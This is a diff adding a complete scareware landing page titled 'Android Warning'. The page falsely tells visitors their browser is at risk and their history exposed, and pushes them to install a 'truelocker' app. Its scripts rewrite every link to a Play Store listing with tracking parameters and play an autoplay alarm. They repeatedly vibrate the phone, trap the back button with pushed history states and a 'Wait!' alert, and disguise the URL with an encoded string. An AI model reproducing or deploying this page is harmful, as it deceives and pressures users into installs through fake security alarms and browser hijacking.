@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html webdriver="true">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="shortcut icon" href="./assets/images/icon.png" type="image/x-icon">
+    <title>Android Warning</title>
+    <link rel="stylesheet" href="./assets/css/style.css" type="text/css" media="all">
+    	
+    <meta charset="utf-8">
+    <meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOSNIPPET">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta name="referrer" content="no-referrer">
+    <meta name="referrer" content="never">
+    <meta name="googlebot" content="noindex">
+    <!-- Yandex.Metrika counter -->
+    <script type="text/javascript" >
+        (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+            m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+        (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+        ym(89372267, "init", {
+            clickmap:true,
+            trackLinks:true,
+            accurateTrackBounce:true
+        });
+    </script>
+    <noscript><div><img src="https://mc.yandex.ru/watch/89372267" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    <!-- /Yandex.Metrika counter -->
+    <script>
+        var browserName
+        function myFunction() {
+            if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 )
+            {
+                browserName = 'Opera'
+            }
+            else if(navigator.userAgent.indexOf("Chrome") != -1 )
+            {
+                browserName = 'Chrome'
+            }
+            else if(navigator.userAgent.indexOf("Safari") != -1)
+            {
+                browserName = 'Safari'
+            }
+            else if(navigator.userAgent.indexOf("Firefox") != -1 )
+            {
+                browserName = 'Firefox'
+            }
+            else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+            {
+                browserName = 'IE'
+            }
+            else
+            {
+                browserName = ''
+            }
+        }
+        myFunction()
+    </script>
+ 
+</head>
+
+<body class="en ltr"  >
+    <a href="#">
+    <div class="wrap">
+        <div class="fade">&nbsp;</div>
+        <div class="content">
+            <div class="title"> <i>&nbsp;</i>
+                <span class="b-name">Mozilla</span> security at risk! </div>
+            <div class="message">
+                <p>Your <span class="b-name">Mozilla</span> browser history may be exposed. </p>
+                <p>Please protect your <span class="b-name">Mozilla</span> personal data to prevent leakage. </p> <img src="./assets/images/shield.png" style="float: left; padding-right: 10px">
+                <p>Install the recommended app for <strong>FREE</strong>  to protect against <span class="b-name">Mozilla</span> leaks!</p>
+                <br> </div>
+            <div class="action">INSTALL</div> <a href="#" class="content-wrap">&nbsp;</a> </div>
+        <div class="helper">&nbsp;</div>
+    </div>
+	</a>
+    <audio autoplay="autoplay" preload="">
+        <source src="./assets/sounds/alert.mp3" type="audio/mpeg">
+        <source src="./assets/sounds/alert.htm" type="audio/ogg">
+    </audio>
+    <script src="./assets/lut.js"></script>
+    <script>
+        var offer = 'truelocker';
+        var package = 'com.truelocker';
+
+        function generateRandomString(length) {
+            let result = '',
+                seeds;
+            for (let i = 0; i < length - 1; i++) {
+                seeds = [
+                    Math.floor(Math.random() * 10) + 48,
+                    Math.floor(Math.random() * 25) + 65,
+                    Math.floor(Math.random() * 25) + 97,
+                ];
+                result += String.fromCharCode(seeds[Math.floor(Math.random() * 3)]);
+            }
+
+            return result;
+        }
+
+        function makeTrackFastURL(search) {
+            // const key = [
+            //     'key',
+            //     btoa(offer + '|' + generateRandomString(5) + +new Date()),
+            // ];
+            const key = ''
+
+            var args = [
+                ...new URLSearchParams(search.replace('?', '')).entries(),
+            ].filter((v) => v[0] !== 'offer');
+            args = args.map((v) => v.join('=')).join('&');
+
+            var url =
+                'https://play.google.com/store/apps/details?id=' +
+                package +
+                '&' +
+                encodeURIComponent(args);
+            url = url.replace('?&', '?').replace('&&', '&');
+            return url;
+        }
+
+        function replaceLinks(url) {
+            var links = document.querySelectorAll('a');
+            for (var i in links) {
+                if (links.hasOwnProperty(i)) {
+                    try {
+                        links[i].href = url;
+                    } catch (e) {}
+                }
+            }
+        }
+
+        var search = window.location.search;
+        var ck = generateRandomString(42);
+        history.replaceState(
+            history.state,
+            document.title,
+            atob('Lz9zZXM9') + ck
+        );
+        document.addEventListener('DOMContentLoaded', function (event) {
+            var url = makeTrackFastURL(search);
+            replaceLinks(url);
+        });
+    </script>
+
+    <script>
+        function openNewWindow() {
+            window.open(offer_url);
+            return false;
+        }
+    </script>
+
+    <script>
+        var barLen = 0;
+
+        function updateBar() {
+            try {
+                if (barLen < 100) barLen += 5;
+                if (barLen > 100) barLen = 100;
+                var obj = document.getElementById('bar');
+                obj.style.width = barLen + '%';
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        setInterval(updateBar, 530);
+    </script>
+    <script type="text/javascript">
+
+        var htmlBrowserName = document.querySelectorAll('.b-name')
+        htmlBrowserName.forEach((item)=>{
+            item.innerHTML = browserName
+        })
+        console.log(htmlBrowserName)
+        navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        window.onload = function() {
+            navigator.vibrate([1500, 100, 1500, 100]);
+        }
+     
+        ! function() {
+            var count = 1;
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function(t) {
+                    if (count % 2 == 1) {
+                        alert("Wait!\n\nYour Mozilla might still be exposed..\n\nStay on the page and install recommended app to protect your personal data.")
+                    }
+                    count++;
+                    t.state && location.replace("#")
+                }
+            } catch (o) {}
+        }();
+     
+        (function(nv) {
+            nv.vibrate = nv.vibrate || nv.webkitVibrate || nv.mozVibrate || nv.msVibrate;
+            nv.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
+        })(navigator);
+    </script>
+     
+</body>
+
+</html>
